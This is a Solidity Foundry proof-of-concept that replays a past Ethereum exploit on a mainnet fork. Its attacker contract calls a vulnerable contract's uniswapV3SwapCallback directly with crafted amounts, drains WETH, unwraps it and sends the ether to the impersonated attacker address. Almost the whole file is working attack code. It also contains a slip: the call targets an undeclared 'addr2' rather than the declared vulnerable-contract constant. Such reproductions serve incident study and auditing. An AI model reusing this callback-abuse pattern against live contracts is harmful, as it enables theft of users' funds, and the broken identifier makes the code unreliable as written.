pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $1.7k
// Attacker : https://etherscan.io/address/0xf073a21f0d68adacfff34d5b8df04550c944e348
// Attack Contract : https://etherscan.io/address/0xd683b81c2608980db90a6fd730153e04629ff1a3
// Vulnerable Contract : https://etherscan.io/address/0x03f911aedc25c770e701b8f563e8102cfacd62c0
// Attack Tx : https://etherscan.io/tx/0x1a3e9eb5e00f39e84f90ca23bd851aa194b1e7a90003e3f6b9b17bbb66dabbb9

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x03f911aedc25c770e701b8f563e8102cfacd62c0

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1834488796953673862
// Twitter Guy : https://x.com/TenArmorAlert/status/1834488796953673862
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant vul_contract = 0x03F911AeDc25c770e701B8F563E8102CfACd62c0;
address constant attacker = 0xf073a21f0D68aDaCfff34D5b8DF04550c944e348;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20737848);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        // deal(address(attC), 0.7370354703656878 ether); // give only ether
        deal(weth9, address(attC), 737035470365687849); // give WETH
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xD683B81c2608980DB90a6fD730153e04629ff1A3
contract AttackerC {
    receive() external payable {}

    function attack() public {
        bytes memory data = abi.encode(
            address(weth9),
            address(this),
            uint256(10000)
        );
        (bool ok, ) = addr2.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(737035470365687848),
                int256(-18035979692517947),
                data
            )
        );
        require(ok, "callback failed");

        uint256 bal = IWETH9(weth9).balanceOf(address(this));
        IWETH9(weth9).withdraw(bal - 1);
        // here, we didn't transfer ether to the block.coinbase
        payable(msg.sender).transfer(address(this).balance);
    }
  
    fallback() external payable {}
}

interface IWETH9 {
	function withdraw(uint256) external;
	function balanceOf(address) external view returns (uint256); 
}